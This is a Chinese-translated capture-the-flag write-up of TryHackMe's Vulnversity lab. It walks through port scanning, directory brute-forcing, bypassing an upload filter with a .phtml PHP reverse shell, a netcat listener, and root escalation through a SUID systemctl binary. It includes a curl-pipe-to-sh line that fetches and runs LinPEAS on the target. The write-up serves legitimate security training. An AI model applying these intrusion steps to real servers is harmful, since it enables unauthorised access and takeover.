<html>
<head>
<title>TryHackMe. Hacking a Vulnversity Machine.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe。入侵一台大学机器。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-hacking-a-vulnversity-machine-a5eff51a6332?source=collection_archive---------2-----------------------#2020-07-18">https://infosecwriteups.com/tryhackme-hacking-a-vulnversity-machine-a5eff51a6332?source=collection_archive---------2-----------------------#2020-07-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="1317" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你对学习道德黑客/ pentesting感兴趣，请查看我的TryHackMe Vulnversity walk through。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/aeab382fb61d611c8c8f084e83a3669f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hGTrWKWIWbVhifsRzVLv8w.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">从尝试hackme.com检索</figcaption></figure><ol class=""><li id="bf0b" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk lg lh li lj bi translated">侦察</li></ol><p id="8f0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">危害给定机器的第一步是使用Nmap进行端口扫描。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lk"><img src="../Images/13caa7f6d27ac553b269d921c8fbbdc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E_6mByQEAQV268TlmbdApg.png"/></div></div></figure><p id="eac9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在这次扫描中使用的开关是:</p><ul class=""><li id="22f0" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk ll lh li lj bi translated">-sV(用于服务版本发现)</li><li id="5946" class="lb lc iq jp b jq lm ju ln jy lo kc lp kg lq kk ll lh li lj bi translated">-oN(用于将结果保存在Nmap格式的文件中)</li></ul><p id="a277" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们从结果中看到的，有一个web服务器运行在端口#3333上。让我们打开它，看看它会呈现给我们什么。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lr"><img src="../Images/81d0a5377d4ecd630411ad6e8dc16b55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*It2BBUOAma-6720VJ8s2_w.png"/></div></div></figure><p id="71d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来像大学网站的普通主页。继续下一步。</p><p id="f282" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.目录遍历</p><p id="2a8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在处理网站渗透测试时使用的一个常见做法是在最开始时运行几次扫描。当发现网络服务器上的目录时，GoBuster是一种非常方便的扫描工具。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/764d2b80eb5e2dd3c6dbccf8376febf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:584/format:webp/1*eDZ12FB0DIncMIn-RvpMdQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">从tryhackme.com取回</figcaption></figure><p id="4c34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事不宜迟，让我们运行扫描，看看我们会得到什么结果。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lt"><img src="../Images/96d3fc1071fe889f101572767bbd92ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BfQyjRfzvyq38HW3ASSXWQ.png"/></div></div></figure><p id="9374" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本的GoBuster语法如下:</p><p id="2c10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">gobuster dir-u&lt;URI&gt;-w/path/to/the/word list</strong></p><ul class=""><li id="b74c" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk ll lh li lj bi translated"><em class="lu"> dir </em>关键字用于direcroty蛮力</li><li id="7f11" class="lb lc iq jp b jq lm ju ln jy lo kc lp kg lq kk ll lh li lj bi translated"><em class="lu"> -u </em>是URL规范的一个选项</li><li id="ba76" class="lb lc iq jp b jq lm ju ln jy lo kc lp kg lq kk ll lh li lj bi translated"><em class="lu"> -w </em>指定单词列表</li></ul><p id="4768" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的例子中，我对常用目录使用了common.txt单词表。现在，它涉及到目录遍历本身，下面的截图显示web服务器实际上是易受攻击的。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lv"><img src="../Images/ac07be37a9605007ef6d62b40700e2f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bHWOL7cMBAaYDWeF2fe4_g.png"/></div></div></figure><p id="d7b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没有适当清理的上传表单会给服务器带来一些麻烦，因为攻击者可能会上传恶意的可执行文件。</p><p id="8978" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.危及网络服务器</p><p id="e273" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了查看服务器可以接受哪些扩展，我们可以尝试手动上传或者使用BurpSuite这样的自动化工具。</p><p id="25f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们最感兴趣的扩展名是. php，为什么？因为PHP是用于构建web应用程序逻辑的最常见的后端编程语言。php有不同的风格，所以我们将尝试其中的五种:PHP、php3、php4、php5和phtml。</p><p id="7efa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了提交指定的扩展，BurpSuite入侵者的狙击攻击将非常有用。下面的截图描述了我们攻击的结果。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lw"><img src="../Images/25a16fbe4c263e695ef1bd560d6bf298.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QY8WJt2lYi1SeUSNdlYctg.png"/></div></div></figure><p id="7389" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好像是。phtml扩展已成功上传。</p><p id="e4c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，是时候进一步用。phtml扩展名，这将使我们能够访问易受攻击的服务器。该文件的有效负载将是来自著名的Pentestmonkey的php-reverse-shell。你只需要在谷歌里输入pentestmonkey php-reverse-shell，然后去他的GitHub页面就可以找到。</p><p id="6e26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们需要用。phtml扩展，进行一些更改(IP地址和端口号(可选))，我们就可以开始了。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lk"><img src="../Images/4b5d2760022bef30f991b7778be187d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MDHJg-z7mrYtHe74c6rXuA.png"/></div></div></figure><p id="b093" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<em class="lu"> $ip </em>字段中，指定您自己机器的ip地址，因为脚本执行时将连接到该字段中指定的ip地址。</p><p id="3705" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提交文件后，我们需要做两件事。首先，为了从我们上传到服务器的脚本中获得想要的结果，我们的机器应该能够监听来自目标的传入连接。第二，必须执行脚本，因此连接被初始化。</p><p id="033f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于第一个目标，我们将使用带有以下开关的NetCat实用程序:<strong class="jp ir"> -l </strong>用于监听，<strong class="jp ir"> -v </strong>用于详细输出，<strong class="jp ir"> -n </strong>用于禁用dns查找，以及<strong class="jp ir"> -p </strong>用于端口号。</p><p id="4573" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于第二个目标，我们可以手动检查保存上传的潜在位置，或者我们可以使用GoBuster。</p><p id="97d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有设置完成后，应该是这样的:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lx"><img src="../Images/6271b481d01862c0bbf48b56d0f13a3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GOfb19zVUUCRR-UKEkarBw.png"/></div></div></figure><p id="679e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">文件的执行会给我们一个外壳:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ly"><img src="../Images/2412cf776c73c4206901cf8251dddbfb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nvg5Bvv53KNr_wxW6xJrlw.png"/></div></div></figure><p id="aa49" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.权限提升</p><p id="b7a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们权限提升的第一步是扫描系统，这将揭示PE的潜在区域。为了做到这一点，我们将使用一套工具，称为PEASS(特权升级真棒脚本套件)。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lz"><img src="../Images/ea95b75800df5f829ab5ece85b2ef294.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pxp0cHgaf-m0-apU4EYoPQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">从github.com取回</figcaption></figure><p id="4d2f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，在该套件的脚本中，将只使用一个脚本。它叫做LinPeas，专门用于Linux机器的枚举。</p><p id="a3b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了执行枚举，我们需要将该脚本放在依赖于外壳的易受攻击的web服务器上。以下是可能的选项:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ma"><img src="../Images/6cbccc6704ac9e281f2331bbc354ece4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rwpcvQQSL9RclQwypWkKYw.png"/></div></div></figure><p id="56ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对我有用的是使用Python HTTP server的第二种方法。</p><p id="3316" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">训练是这样的:</p><p id="385f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一步——使用<strong class="jp ir"> git clone </strong>命令将PEASS存储库下载到本地机器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mb"><img src="../Images/1127bbda7b59d3b30d1cf3b7905a9467.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E1jpBxrJDdTkANu_L-9ZBg.png"/></div></div></figure><p id="439f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二步—在远程web服务器上传输并执行linpeas.sh文件。</p><p id="9716" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，我们需要在包含linpeas.sh文件的目录中启动Python HTTP server。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ly"><img src="../Images/91dd4aef7f188741624d01afd989421b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c_7h3WYG8iGNanXZsmjtrA.png"/></div></div></figure><p id="cebf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">curl <local_host_ip_addr> /linpeas.sh | sh —这个命令将从本地主机检索文件，并在目标web服务器上执行它。</local_host_ip_addr></p><p id="d8d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是彩色字符串的长输出。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mc"><img src="../Images/38257834172955985cd1242f2e48872c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NaNMVV58zHOwYs5OUF75Nw.png"/></div></div></figure><p id="3b8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">黄底红的配色方案表示一个物体99%可以用于PE。</p><p id="a677" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">LinPeas说/bin/systemctl程序设置了SUID位，这将允许非根用户以根权限运行它。</p><p id="5a13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GTFOBins是特权提升的最佳资源之一。当涉及到权限提升时，您肯定可以去那里检查您的发现结果。在我们的示例中，systemctl实用程序设置了SUID位，这使得标准用户能够以提升的(sudo)权限运行该命令。</p><p id="7e73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是从GTFOBins网站上检索到的一个快速解释，引用了systemctl上设置了SUID位的PE。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi md"><img src="../Images/c63d853168cde2512121073f5913ac44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZnSTo3r-WkAaGAp8oe8PXg.png"/></div></div></figure><p id="38a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在进入漏洞利用的第二部分之前，我们先来获得一个更稳定的外壳。我们可以通过使用python来实现。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi me"><img src="../Images/a0f5fc1ef378ed317b212c340f94ca78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DB-UnF7TMi0rJv_mI-GcAw.png"/></div></div></figure><p id="e76a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lu">-c "</em>带有python3命令的开关允许我们在命令行中直接输入代码。该命令本身使用Python的pty库来生成bash shell。</p><p id="090d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在获得一个稳定的shell之后，我们可以回到GTFOBins systemctl漏洞并在根文件夹中获得所需的标志。</p></div></div>    
</body>
</html>